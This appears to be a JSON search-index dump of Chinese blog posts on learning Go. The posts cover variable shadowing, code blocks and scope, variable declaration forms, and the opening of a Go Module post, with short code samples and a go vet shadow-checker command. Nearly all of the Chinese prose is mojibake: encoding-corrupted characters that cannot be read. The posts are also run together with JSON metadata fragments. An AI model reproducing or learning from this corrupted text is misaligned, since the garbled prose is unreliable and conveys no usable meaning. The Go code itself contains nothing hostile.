é™·å…¥æ¼«é•¿çš„è°ƒè¯•è¿‡ç¨‹ã€‚ ä¸€ä¸ªé—®é¢˜1234567891011121314151617package mainimport \"fmt\"var x = 10func foo(n int) &#123; x := 1 x += n&#125;func main() &#123; fmt.Println(\"x = \", x) // 10 foo(99) fmt.Println(\"è°ƒç”¨å‡½æ•°ä¹‹åï¼Œx ç°åœ¨çš„å€¼æ˜¯ï¼š\", x) // 10&#125; ä¸¤æ¬¡çš„æ‰“å°éƒ½æ˜¯ 10ï¼ŒåŒ…çº§å˜é‡ x çš„å€¼ï¼Œå¹¶æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œè¿™æ˜¯å› ä¸ºè™½ç„¶ foo å‡½æ•°ä¸­ä¹Ÿä½¿ç”¨äº†å˜é‡ xï¼Œä½†æ˜¯ foo å‡½æ•°ä¸­çš„å˜é‡ x é®è”½äº†å¤–é¢çš„åŒ…çº§å˜é‡ xï¼Œè¿™ä½¿å¾—åŒ…çº§å˜é‡ a æ²¡æœ‰å‚ä¸åˆ° foo å‡½æ•°çš„é€»è¾‘ä¸­ï¼Œæ‰€ä»¥å°±æ²¡æœ‰å‘ç”Ÿå˜åŒ–äº†ã€‚ å˜é‡é®è”½åªæ˜¯ä¸ªå¼•å­ï¼Œæƒ³è¦ä¿è¯ä¸å‡ºç°å˜é‡é®è”½çš„é—®é¢˜ï¼Œéœ€è¦æ·±å…¥äº†è§£ä»£ç å—å’Œä½œç”¨åŸŸçš„æ¦‚å¿µåŠå…¶èƒŒåçš„è§„åˆ™ã€‚ ä»£ç å—ä»£ç å—æ˜¯ä»€ä¹ˆï¼ŸGo è¯­è¨€ä¸­çš„ä»£ç å—æ˜¯åŒ…è£¹åœ¨ä¸€å¯¹å¤§æ‹¬å·å†…éƒ¨çš„å£°æ˜å’Œè¯­å¥åºåˆ—ï¼Œå¦‚æœä¸€å¯¹å¤§æ‹¬å·å†…éƒ¨æ²¡æœ‰ä»»ä½•å£°æ˜æˆ–å…¶ä»–è¯­å¥ï¼Œæˆ‘ä»¬å°±æŠŠå®ƒå«åšç©ºä»£ç å—ã€‚ ä¾‹å¦‚ï¼š 1234567func foo() &#123; // ä»£ç å—1 &#123; // ä»£ç å—2 &#123; // ä»£ç å—3 &#125; &#125;&#125; åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œå‡½æ•° foo çš„å‡½æ•°ä½“æ˜¯æœ€å¤–å±‚çš„ä»£ç å—ï¼Œè¿™é‡Œå°†å®ƒç¼–å·ä¸ºä»£ç å— 1ã€‚è€Œä¸”ï¼Œåœ¨å®ƒçš„å‡½æ•°ä½“å†…éƒ¨ï¼ŒåˆåµŒå¥—äº†ä¸¤å±‚ä»£ç å—ï¼Œç”±å¤–å‘å†…çœ‹åˆ†åˆ«ä¸ºä»£ç å— 2ã€ä»£ç å— 3ã€‚ å½¢å¦‚ä»£ç å— 1 åˆ°ä»£ç å— 3 è¿™æ ·çš„ä»£ç å—ï¼Œå®ƒä»¬éƒ½æ˜¯ç”±ä¸¤ä¸ªè‚‰çœ¼å¯è§çš„ä¸”é…å¯¹çš„å¤§æ‹¬å·åŒ…è£¹èµ·æ¥çš„ï¼Œæˆ‘ä»¬ç§°è¿™æ ·çš„ä»£ç å—ä¸ºæ˜¾å¼ä»£ç å—ï¼ˆExplicit Blocksï¼‰ã€‚ æ—¢ç„¶æœ‰æ˜¾å¼ä»£ç å—çš„å­˜åœ¨ï¼Œæ²¡é”™ï¼Œä¸ä¹‹å¯¹åº”çš„å°±æ˜¯éšå¼ä»£ç å—ã€‚éšå¼ä»£ç å—æ²¡æœ‰æ˜¾å¼ä»£ç å—é‚£æ ·çš„è‚‰çœ¼å¯è§çš„é…å¯¹å¤§æ‹¬å·åŒ…è£¹ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡å¤§æ‹¬å·æ¥è¯†åˆ«éšå¼ä»£ç å—ã€‚ æ€ä¹ˆç†è§£éšå¼ä»£ç å—å‘¢ï¼Ÿ æ¥çœ‹ä¸‹é¢è¿™å¼ å›¾ï¼š å®ƒæ²¡æœ‰æ˜ç¡®çš„å®ä½“ï¼Œåªèƒ½é€šè¿‡æŠ½è±¡çš„æ–¹å¼å»ç†è§£ã€‚ æœ€å¤–é¢çš„å®‡å®™ä»£ç å—ã€é é‡Œé¢çš„åŒ…ä»£ç å—ã€æ–‡ä»¶ä»£ç å—ä»¥åŠifã€forã€switch çš„æ§åˆ¶è¯­å¥ï¼Œè¿™äº›éƒ½æœ‰éšå¼ä»£ç å—ã€‚ ä½œç”¨åŸŸæŒ‰ç…§å˜é‡çš„ä½œç”¨åŸŸï¼Œå¯ä»¥æŠŠå˜é‡åˆ’åˆ†ä¸ºå±€éƒ¨å˜é‡ã€åŒ…çº§å˜é‡ã€å…¨å±€å˜é‡ã€‚ å±€éƒ¨å˜é‡ åŒ…çº§å˜é‡ å…¨å±€å˜é‡ å®šä¹‰ å®šä¹‰åœ¨å‡½æ•°å†…éƒ¨çš„å˜é‡ã€æ–¹æ³•æ¥æ”¶å™¨å˜é‡ä»¥åŠå‡½æ•°çš„å½¢å‚éƒ½ç®—å±€éƒ¨å˜é‡ å®šä¹‰åœ¨å‡½æ•°å¤–é¢çš„å˜é‡ç§°ä¸ºåŒ…çº§å˜é‡ åŒæ ·æ˜¯å®šä¹‰åœ¨å‡½æ•°å¤–é¢çš„å˜é‡ï¼Œä½†æ˜¯é¦–å­—æ¯å¤§å°ï¼Œé‚£ä¹ˆè¿™ä¸ªåŒ…çº§å˜é‡å°±ä¼šè¢«è§†ä¸ºå…¨å±€å˜é‡ ä½œç”¨åŸŸèŒƒå›´ ä»å®šä¹‰é‚£ä¸€è¡Œå¼€å§‹ç›´åˆ°ä¸å…¶æ‰€åœ¨çš„ä»£ç å—ç»“æŸ å½“å‰åŒ…æ–‡ä»¶éƒ½å¯è§ æ•´ä¸ª Go ç¨‹åºéƒ½å¯è§ ç”Ÿå‘½å‘¨æœŸ ä»ç¨‹åºè¿è¡Œåˆ°å®šä¹‰é‚£ä¸€è¡Œå¼€å§‹åˆ†é…å­˜å‚¨ç©ºé—´ç›´è‡³ç¨‹åºç¦»å¼€è¯¥å˜é‡æ‰€åœ¨çš„ä½œç”¨åŸŸ ç¨‹åºå¯åŠ¨æ—¶åˆå§‹åŒ–ï¼Œç›´è‡³ç¨‹åºç»“æŸ ç¨‹åºå¯åŠ¨æ—¶åˆå§‹åŒ–ï¼Œç›´è‡³ç¨‹åºç»“æŸ é¿å…å˜é‡é®è”½çš„åŸåˆ™åœ¨äº†è§£äº† Go è¯­è¨€çš„ä»£ç å—å’Œä½œç”¨åŸŸä¹‹åï¼Œå†æ¥çœ‹çœ‹å‰é¢çš„é‚£ä¸ªå˜é‡é®è”½é—®é¢˜ã€‚ è¿™ä¸€æ¬¡åŒæ—¶æŠŠå˜é‡çš„åœ°å€æ‰“å°å‡ºæ¥ï¼š 123456789101112131415161718192021package mainimport \"fmt\"var x = 10func foo(n int) &#123; x := 1 fmt.Println(&amp;x, x) // 0xc00001c0a8 1 x += n fmt.Println(&amp;x, x) // 0xc00001c0a8 100&#125;func main() &#123; fmt.Println(\"x = \", x) fmt.Println(&amp;x, x) // 0x111c368 10 foo(99) fmt.Println(&amp;x, x) // 0x111c368 10&#125; ä»ä¸Šé¢çš„è¾“å‡ºå¯ä»¥è¿›ä¸€æ­¥ç¡®è®¤ï¼Œå› ä¸ºä½œç”¨åŸŸçš„ä¸åŒï¼Œåœ¨å†…å­˜ä¸­å®é™…å¯¹åº”ä¸¤ä¸ªä¸åŒçš„åœ°å€ã€‚ å†…å­˜åˆ†é…å‘ç”Ÿåœ¨è¿è¡ŒæœŸï¼Œç¼–è¯‘åçš„æœºå™¨ç ä»ä¸ä½¿ç”¨å˜é‡åï¼Œè€Œæ˜¯ç›´æ¥é€šè¿‡å†…å­˜åœ°å€æ¥è®¿é—®ç›®æ ‡æ•°æ®ã€‚å°½ç®¡å˜é‡çš„åç§°æ˜¯ç›¸åŒçš„ï¼Œä½†æ˜¯å†…å­˜åœ°å€å¹¶ä¸ç›¸åŒï¼Œæ‰€ä»¥æœ¬è´¨ä¸Šå°±ä¸æ˜¯åŒä¸€ä¸ªå˜é‡ã€‚ å†æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼ŒåŠ æ·±ä¸€ä¸‹å°è±¡ï¼š 1234567891011121314package mainimport \"fmt\"// åŒ…çº§å˜é‡var y = 12func main() &#123; fmt.Println(&amp;y, y) // 0x111c370 12 // å±€éƒ¨å˜é‡ y := 24 fmt.Println(&amp;y, y) // 0xc00001c0d8 24&#125; å˜é‡é®è”½é—®é¢˜çš„æ ¹æœ¬åŸå› ï¼Œå°±æ˜¯å†…å±‚ä»£ç å—ä¸­å£°æ˜äº†ä¸€ä¸ªä¸å¤–å±‚ä»£ç å—åŒåä¸”åŒç±»å‹çš„å˜é‡ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´å†…å±‚ä»£ç å—ä¸­çš„åŒåå˜é‡å°±ä¼šæ›¿ä»£å¤–å±‚å˜é‡ï¼Œå‚ä¸æ­¤å±‚ä»£ç å—å†…çš„ç›¸å…³è®¡ç®—ï¼Œä»è€Œè¢«å½¢è±¡åœ°ç§°ä¹‹ä¸ºå†…å±‚å˜é‡é®è”½äº†å¤–å±‚åŒåå˜é‡ã€‚ è§£å†³æ–¹æ¡ˆå¯ä»¥åˆ©ç”¨å®˜æ–¹æä¾›çš„ go vet å·¥å…·æ£€æµ‹å˜é‡é®è”½é—®é¢˜ï¼Œè¯¥å·¥å…·ç”¨äºå¯¹ Go æºç åšä¸€ç³»åˆ—é™æ€æ£€æŸ¥ã€‚ åœ¨ Go 1.14 ç‰ˆä»¥å‰é»˜è®¤æ”¯æŒå˜é‡é®è”½æ£€æŸ¥ï¼ŒGo 1.14 ç‰ˆä¹‹åï¼Œå˜é‡é®è”½æ£€æŸ¥çš„æ’ä»¶å°±éœ€è¦æˆ‘ä»¬å•ç‹¬å®‰è£…äº†ï¼Œå®‰è£…æ–¹æ³•å¦‚ä¸‹ï¼š 123$go install golang.org/x/tools/go/analysis/passes/shadow/cmd/shadow@latestgo: downloading golang.org/x/tools v0.1.5go: downloading golang.org/x/mod v0.4.2 Go é»˜è®¤ä¸åšè¦†ç›–æ£€æŸ¥ï¼Œæ·»åŠ  shadow é€‰é¡¹æ¥å¯ç”¨ï¼š 12$ go vet -vettool=$(which shadow) -strict complex.go ./complex.go:13:12: declaration of \"err\" shadows declaration at line 11 å·¥å…·ç¡®å®å¯ä»¥è¾…åŠ©æ£€æµ‹ï¼Œä½†ä¹Ÿä¸æ˜¯ä¸‡èƒ½çš„ï¼Œæ‰€ä»¥ç¼–ç æ—¶ï¼Œéœ€è¦æ³¨æ„åŒåå˜é‡çš„å£°æ˜ä»¥åŠçŸ­å˜é‡å£°æ˜çš„ä½œç”¨åŸŸã€‚ å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”å˜é‡å£°æ˜","slug":"go-language-study-notes-variable-declaration","date":"2022-10-24T09:33:12.000Z","updated":"2023-02-18T03:28:33.598Z","comments":true,"path":"go-language-study-notes-variable-declaration/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-variable-declaration/","excerpt":"Go è¯­è¨€å´‡å°šâ€œåšä¸€ä»¶äº‹åªç”¨ä¸€ç§æ–¹æ³•â€ï¼Œä½†å˜é‡å£°æ˜å´ä¼¼ä¹æ˜¯ä¸€ä¸ªä¾‹å¤–ï¼Œå› ä¸ºåœ¨ Go è¯­è¨€ä¸­ï¼Œå£°æ˜ä¸€ä¸ªå˜é‡æœ‰å¤šç§æ–¹å¼ã€‚","text":"Go è¯­è¨€å´‡å°šâ€œåšä¸€ä»¶äº‹åªç”¨ä¸€ç§æ–¹æ³•â€ï¼Œä½†å˜é‡å£°æ˜å´ä¼¼ä¹æ˜¯ä¸€ä¸ªä¾‹å¤–ï¼Œå› ä¸ºåœ¨ Go è¯­è¨€ä¸­ï¼Œå£°æ˜ä¸€ä¸ªå˜é‡æœ‰å¤šç§æ–¹å¼ã€‚ å‰è¨€åœ¨ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œä¸ºäº†æ–¹ä¾¿æ“ä½œå†…å­˜ç‰¹å®šä½ç½®çš„æ•°æ®ï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ªç‰¹å®šçš„åå­—ä¸ä½äºç‰¹å®šä½ç½®çš„å†…å­˜å—ç»‘å®šåœ¨ä¸€èµ·ï¼Œè¿™ä¸ªåå­—è¢«ç§°ä¸ºå˜é‡ã€‚ ä½†è¿™å¹¶ä¸ä»£è¡¨æˆ‘ä»¬å¯ä»¥é€šè¿‡å˜é‡éšæ„å¼•ç”¨æˆ–ä¿®æ”¹å†…å­˜ï¼Œå˜é‡æ‰€ç»‘å®šçš„å†…å­˜åŒºåŸŸæ˜¯è¦æœ‰ä¸€ä¸ªæ˜ç¡®çš„è¾¹ç•Œçš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡ä¸€ä¸ªå˜é‡ï¼Œç©¶ç«Ÿå¯ä»¥æ“ä½œ 4 ä¸ªå­—èŠ‚å†…å­˜è¿˜æ˜¯ 8 ä¸ªå­—èŠ‚å†…å­˜ï¼Œç¼–ç¨‹è¯­è¨€çš„ç¼–è¯‘å™¨æˆ–è§£é‡Šå™¨éœ€è¦æ˜ç¡®åœ°çŸ¥é“ã€‚ é‚£ä¹ˆï¼Œç¼–ç¨‹è¯­è¨€çš„ç¼–è¯‘å™¨æˆ–è§£é‡Šå™¨æ˜¯å¦‚ä½•çŸ¥é“ä¸€ä¸ªå˜é‡æ‰€èƒ½å¼•ç”¨çš„å†…å­˜åŒºåŸŸè¾¹ç•Œå‘¢ï¼Ÿ åŠ¨æ€è¯­è¨€çš„è§£é‡Šå™¨å¯ä»¥åœ¨è¿è¡Œæ—¶é€šè¿‡å¯¹å˜é‡èµ‹å€¼çš„åˆ†æï¼Œè‡ªåŠ¨ç¡®å®šå˜é‡çš„è¾¹ç•Œã€‚ è€Œé™æ€è¯­è¨€å°±ä¸ä¸€æ ·äº†ï¼Œç¼–è¯‘å™¨æ²¡æœ‰åŠæ³•è‡ªåŠ¨ç¡®å®šå˜é‡çš„è¾¹ç•Œï¼Œæ­¤æ—¶å°±éœ€è¦è¯­è¨€çš„ä½¿ç”¨è€…æä¾›ï¼Œäºæ˜¯å°±æœ‰äº†â€œå˜é‡å£°æ˜â€ã€‚é€šè¿‡å˜é‡å£°æ˜ï¼Œè¯­è¨€ä½¿ç”¨è€…å¯ä»¥æ˜¾å¼å‘ŠçŸ¥ç¼–è¯‘å™¨ä¸€ä¸ªå˜é‡çš„è¾¹ç•Œä¿¡æ¯ã€‚ å˜é‡å£°æ˜Go æ˜¯é™æ€è¯­è¨€ï¼Œæ‰€æœ‰å˜é‡åœ¨ä½¿ç”¨å‰å¿…é¡»å…ˆè¿›è¡Œå£°æ˜ã€‚å£°æ˜çš„æ„ä¹‰åœ¨äºå‘Šè¯‰ç¼–è¯‘å™¨è¯¥å˜é‡å¯ä»¥æ“ä½œçš„å†…å­˜çš„è¾¹ç•Œä¿¡æ¯ï¼Œè€Œè¿™ç§è¾¹ç•Œé€šå¸¸åˆæ˜¯ç”±å˜é‡çš„ç±»å‹ä¿¡æ¯æä¾›çš„ã€‚ é€šç”¨å£°æ˜åœ¨ Go è¯­è¨€ä¸­ï¼Œæœ‰ä¸€ä¸ªé€šç”¨çš„å˜é‡å£°æ˜æ–¹æ³•æ˜¯è¿™æ ·çš„ï¼š 1var a int = 10 è¿™ä¸ªå˜é‡å£°æ˜åˆ†ä¸ºå››ä¸ªéƒ¨åˆ†ï¼š var æ˜¯ä¿®é¥°å˜é‡å£°æ˜çš„å…³é”®å­— a ä¸ºå˜é‡å int ä¸ºè¯¥å˜é‡çš„ç±»å‹ 10 æ˜¯å˜é‡çš„åˆå€¼ åœ¨ Go è¯­è¨€ä¸­ï¼Œæ— è®ºä»€ä¹ˆç±»å‹çš„å˜é‡ï¼Œéƒ½å¯ä»¥ä½¿ç”¨è¿™ç§å½¢å¼è¿›è¡Œå˜é‡å£°æ˜ï¼Œè¿™å°±æ˜¯é€šç”¨çš„å£°æ˜æ–¹å¼ã€‚ å¦å¤–ï¼Œé™¤äº†å•ç‹¬å£°æ˜æ¯ä¸ªå˜é‡å¤–ï¼ŒGo è¯­è¨€è¿˜æä¾›äº†å˜é‡å£°æ˜å—ï¼ˆblockï¼‰çš„è¯­æ³•å½¢å¼ï¼Œå¯ä»¥ç”¨ä¸€ä¸ª var å…³é”®å­—å°†å¤šä¸ªå˜é‡å£°æ˜æ”¾åœ¨ä¸€èµ·ï¼š 1234var ( a, b, c int = 5, 6, 7 c, d, e rune = 'C', 'D', 'E') Go è¯­è¨€è¿˜æ”¯æŒåœ¨ä¸€è¡Œå˜é‡å£°æ˜ä¸­åŒæ—¶å£°æ˜å¤šä¸ªå˜é‡ï¼š 1var a, s = 1, \"ok\" å¦‚æœæ²¡æœ‰æ˜¾å¼ä¸ºå˜é‡èµ‹äºˆåˆå€¼ï¼ŒGo ç¼–è¯‘å™¨ä¼šä¸ºå˜é‡èµ‹äºˆè¿™ä¸ªç±»å‹çš„é›¶å€¼ï¼š 1var a int // açš„åˆå€¼ä¸ºintç±»å‹çš„é›¶å€¼ï¼š0 é‚£ä»€ä¹ˆæ˜¯ç±»å‹çš„é›¶å€¼ï¼ŸGo è¯­è¨€çš„æ¯ç§åŸç”Ÿç±»å‹éƒ½æœ‰å®ƒçš„é»˜è®¤å€¼ï¼Œè¿™ä¸ªé»˜è®¤å€¼å°±æ˜¯é›¶å€¼ã€‚ ä¸‹é¢å°±æ˜¯ Go è§„èŒƒå®šä¹‰çš„å†…ç½®åŸç”Ÿç±»å‹çš„é»˜è®¤å€¼ï¼ˆå³é›¶å€¼ï¼‰ å†…ç½®åŸç”Ÿç±»å‹ é»˜è®¤å€¼ï¼ˆé›¶å€¼ï¼‰ æ‰€æœ‰æ•´å‹ç±»å‹ 0 æµ®ç‚¹ç±»å‹ 0.0 å¸ƒå°”ç±»å‹ FALSE å­—ç¬¦ä¸²ç±»å‹ â€œâ€ æŒ‡é’ˆã€æ¥å£ã€åˆ‡ç‰‡ã€channelã€map å’Œå‡½æ•°ç±»å‹ nil å¦å¤–ï¼Œåƒæ•°ç»„ã€ç»“æ„ä½“è¿™æ ·å¤åˆç±»å‹å˜é‡çš„é›¶å€¼å°±æ˜¯å®ƒä»¬ç»„æˆå…ƒç´ éƒ½ä¸ºé›¶å€¼æ—¶çš„ç»“æœã€‚ é™¤äº†ä¸Šé¢è¿™ç§é€šç”¨çš„å˜é‡å£°æ˜å½¢å¼ï¼ŒGo è¯­è¨€è¿˜æä¾›äº†ä¸¤ç§å˜é‡å£°æ˜çš„â€œè¯­æ³•ç³–â€ã€‚ çœç•¥ç±»å‹ä¿¡æ¯çš„å£°æ˜è¿™ç§æ–¹å¼ä¼šçœç•¥ç±»å‹ä¿¡æ¯çš„å£°æ˜ã€‚ åœ¨é€šç”¨çš„å˜é‡å£°æ˜çš„åŸºç¡€ä¸Šï¼ŒGo ç¼–è¯‘å™¨å…è®¸æˆ‘ä»¬çœç•¥å˜é‡å£°æ˜ä¸­çš„ç±»å‹ä¿¡æ¯ï¼Œå®ƒçš„æ ‡å‡†èŒƒå¼æ˜¯var varName = initExpressionï¼Œæ¯”å¦‚ä¸‹é¢å°±æ˜¯ä¸€ä¸ªçœç•¥äº†ç±»å‹ä¿¡æ¯çš„å˜é‡å£°æ˜ï¼š 1var b = 13 ä½¿ç”¨è¿™ç§æ–¹å¼å£°æ˜çš„å‰ææ˜¯ï¼Œå³ä¾§å­˜åœ¨å˜é‡åˆå€¼ã€‚ 1var b å› ä¸ºæ²¡æœ‰åˆå§‹å€¼çš„å£°æ˜ï¼Œç¼–è¯‘ä¼šæŠ¥é”™â€”â€”â€œunexpected newline, expecting typeâ€ã€‚ ç»“åˆå¤šå˜é‡å£°æ˜ï¼Œå¯ä»¥ä½¿ç”¨è¿™ç§å˜é‡å£°æ˜è¯­æ³•ç³–å£°æ˜å¤šä¸ªä¸åŒç±»å‹çš„å˜é‡ï¼š 1var a, b, c = 12, 'A', \"hello\" åœ¨è¿™ç§å˜é‡å£°æ˜è¯­æ³•ç³–ä¸­ï¼Œæˆ‘ä»¬çœå»äº†å˜é‡ç±»å‹ä¿¡æ¯ï¼Œä½† Go ç¼–è¯‘å™¨ä¼šä¸ºæˆ‘ä»¬è‡ªåŠ¨æ¨å¯¼å‡ºç±»å‹ä¿¡æ¯ã€‚ çŸ­å˜é‡å£°æ˜ä½¿ç”¨çŸ­å˜é‡å£°æ˜æ—¶ï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥çœå» var å…³é”®å­—ä»¥åŠç±»å‹ä¿¡æ¯ï¼Œå®ƒçš„æ ‡å‡†èŒƒå¼æ˜¯varName := initExpressionã€‚ 123a := 12b := 'A'c := \"hello\" çŸ­å˜é‡å£°æ˜ä¸­çš„å˜é‡ç±»å‹ä¹Ÿæ˜¯ç”± Go ç¼–è¯‘å™¨è‡ªåŠ¨æ¨å¯¼å‡ºæ¥çš„ã€‚ çŸ¥é“äº†è¿™ä¹ˆå¤šç§å£°æ˜æ–¹å¼ï¼Œé‚£ä¹ˆåœ¨ä½¿ç”¨æ—¶ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆçº¦æŸå‘¢ï¼Ÿè¿™ä¸ªæ—¶å€™å°±éœ€è¦å­¦ä¹ ç‚¹é¢„å¤‡çŸ¥è¯†ï¼šGo è¯­è¨€çš„ä¸¤ç±»å˜é‡ã€‚ ä¸¤ç±»å˜é‡Go è¯­è¨€çš„å˜é‡æŒ‰ä½œç”¨åŸŸå¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼š åŒ…çº§å˜é‡ï¼šä¹Ÿå°±æ˜¯åœ¨åŒ…çº§åˆ«å¯è§çš„å˜é‡ã€‚å¦‚æœæ˜¯å¯¼å‡ºå˜é‡ï¼ˆå¤§å†™å­—æ¯å¼€å¤´ï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ªåŒ…çº§å˜é‡ä¹Ÿå¯ä»¥è¢«è§†ä¸ºå…¨å±€å˜é‡ï¼ˆå¯ä»¥è¢«å…¶ä»–åŒ…è®¿é—®åˆ°ï¼‰ å±€éƒ¨å˜é‡ï¼šä¹Ÿå°±æ˜¯ Go å‡½æ•°æˆ–æ–¹æ³•ä½“å†…å£°æ˜çš„å˜é‡ï¼Œä»…åœ¨å‡½æ•°æˆ–æ–¹æ³•ä½“å†…å¯è§ åŒ…çº§å˜é‡çš„å£°æ˜å½¢å¼åŒ…çº§å˜é‡åªèƒ½ä½¿ç”¨å¸¦æœ‰ var å…³é”®å­—çš„å˜é‡å£°æ˜å½¢å¼ï¼Œä¸èƒ½ä½¿ç”¨çŸ­å˜é‡å£°æ˜å½¢å¼ï¼Œä½†åœ¨å½¢å¼ç»†èŠ‚ä¸Šå¯ä»¥æœ‰ä¸€å®šçµæ´»åº¦ã€‚ å£°æ˜å¹¶åŒæ—¶æ˜¾å¼åˆå§‹åŒ–1var varName = initExpression å°±åƒå‰é¢è¯´è¿‡é‚£æ ·ï¼ŒGo ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ ¹æ®ç­‰å·å³ä¾§ InitExpression ç»“æœå€¼çš„ç±»å‹ï¼Œæ¥ç¡®å®šå·¦ä¾§å£°æ˜çš„å˜é‡çš„ç±»å‹ï¼Œè¿™ä¸ªç±»å‹ä¼šæ˜¯ç»“æœå€¼å¯¹åº”ç±»å‹çš„é»˜è®¤ç±»å‹ã€‚ å¦‚æœä¸æ¥å—é»˜è®¤ç±»å‹ï¼Œè€Œæ˜¯è¦æ˜¾å¼åœ°ä¸ºåŒ…çº§å˜é‡æŒ‡å®šç±»å‹ï¼Œé‚£ä¹ˆæœ‰ä¸¤ç§æ–¹å¼ï¼š 123456789// ç¬¬ä¸€ç§ï¼švar a = 13 // ä½¿ç”¨é»˜è®¤ç±»å‹var b int32 = 17 // æ˜¾å¼æŒ‡å®šç±»å‹var f float32 = 3.14 // æ˜¾å¼æŒ‡å®šç±»å‹// ç¬¬äºŒç§ï¼švar a = 13 // ä½¿ç”¨é»˜è®¤ç±»å‹var b = int32(17) // æ˜¾å¼æŒ‡å®šç±»å‹var f = float32(3.14) // æ˜¾å¼æŒ‡å®šç±»å‹ ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥ä½¿ç”¨ï¼Œä½†ä»å£°æ˜ä¸€è‡´æ€§çš„è§’åº¦å‡ºå‘ï¼ŒGo æ›´æ¨èæˆ‘ä»¬ä½¿ç”¨åè€…ï¼Œè¿™æ ·èƒ½ç»Ÿä¸€æ¥å—é»˜è®¤ç±»å‹å’Œæ˜¾å¼æŒ‡å®šç±»å‹è¿™ä¸¤ç§å£°æ˜å½¢å¼ã€‚ å£°æ˜ä½†å»¶è¿Ÿåˆå§‹åŒ–å¯¹äºå£°æ˜æ—¶å¹¶ä¸ç«‹å³æ˜¾å¼åˆå§‹åŒ–çš„åŒ…çº§å˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™ç§é€šç”¨å˜é‡å£°æ˜å½¢å¼ï¼š 12var a int32 // 0var f float64 // 0.0 è™½ç„¶è¿™äº›å€¼æ²¡æœ‰åˆå§‹åŒ–ï¼Œä½†æ˜¯ä»æœ‰è‡ªå·±çš„é›¶å€¼ã€‚ å±€éƒ¨å˜é‡çš„å£°æ˜å½¢å¼çŸ­å˜é‡å£°æ˜å½¢å¼æ˜¯å±€éƒ¨å˜é‡æœ€å¸¸ç”¨çš„å£°æ˜å½¢å¼ã€‚ 123a := 17f := 3.14s := \"hello, gopher!\" å¯¹äºä¸æ¥å—é»˜è®¤ç±»å‹çš„å˜é‡ï¼Œä¾ç„¶å¯ä»¥ä½¿ç”¨çŸ­å˜é‡å£°æ˜å½¢å¼ï¼Œåªæ˜¯åœ¨:=å³ä¾§è¦åšä¸€ä¸ªæ˜¾å¼è½¬å‹ï¼Œä»¥ä¿æŒå£°æ˜çš„ä¸€è‡´æ€§ï¼š 123a := int32(17)f := float32(3.14)s := []byte(\"hello, gopher!\") æ€»ç»“åœ¨ Go ä¸­ï¼Œå£°æ˜ä¸€ä¸ªå˜é‡æœ‰å¤šç§æ–¹å¼ï¼Œå…·ä½“ä½¿ç”¨å“ªä¸€ç§ï¼Œéœ€è¦æ ¹æ®å®é™…æƒ…å†µè€Œå®šï¼šæ˜¯åŒ…çº§å˜é‡è¿˜æ˜¯å±€éƒ¨å˜é‡ã€æ˜¯å¦éœ€è¦å»¶è¿Ÿåˆå§‹åŒ–ã€æ˜¯å¦æ¥å—é»˜è®¤ç±»å‹ã€æ˜¯å¦æ˜¯åˆ†æ”¯æ§åˆ¶å˜é‡ç­‰ é€šç”¨å˜é‡å£°æ˜å’Œè¯­æ³•ç³–çš„åŒºåˆ«åœ¨äºï¼Œè¯­æ³•ç³–å£°æ˜å¯ä»¥çœç•¥å˜é‡çš„ç±»å‹ä¿¡æ¯ã€‚ å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”è®¤è¯†Go Module","slug":"go-language-study-notes-get-to-know-go-module","date":"2022-10-24T09:30:54.000Z","updated":"2023-02-18T03:28:33.588Z","comments":true,"path":"go-language-study-notes-get-to-know-go-module/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-get-to-know-go-module/","excerpt":"Go module æ„å»ºæ¨¡å¼æ˜¯åœ¨ Go 1.11 ç‰ˆæœ¬æ­£å¼å¼•å…¥çš„ï¼Œä¸ºçš„æ˜¯å½»åº•è§£å†³ Go é¡¹ç›®å¤æ‚ç‰ˆæœ¬ä¾èµ–çš„é—®é¢˜ï¼Œåœ¨ Go 1.16 ç‰ˆæœ¬ä¸­ï¼ŒGo module å·²ç»æˆä¸ºäº† Go é»˜è®¤çš„åŒ…ä¾èµ–ç®¡ç†æœºåˆ¶å’Œ Go æºç æ„å»ºæœºåˆ¶ã€‚","text":"Go module æ„å»ºæ¨¡å¼æ˜¯åœ¨ Go 1.11 ç‰ˆæœ¬æ­£å¼å¼•å…¥çš„ï¼Œä¸ºçš„æ˜¯å½»åº•è§£å†³ Go é¡¹ç›®å¤æ‚ç‰ˆæœ¬ä¾èµ–çš„é—®é¢˜ï¼Œåœ¨ Go 1.16 ç‰ˆæœ¬ä¸­ï¼ŒGo module å·²ç»æˆä¸ºäº† Go é»˜è®¤çš„åŒ…ä¾èµ–ç®¡ç†æœºåˆ¶å’Œ Go æºç æ„å»ºæœºåˆ¶ã€‚ Go Module çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªåä¸º go.mod çš„æ–‡ä»¶ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­å­˜å‚¨äº†è¿™ä¸ª module å¯¹ç¬¬ä¸‰æ–¹ä¾èµ–çš„å…¨éƒ¨ä¿¡æ¯ã€‚ go 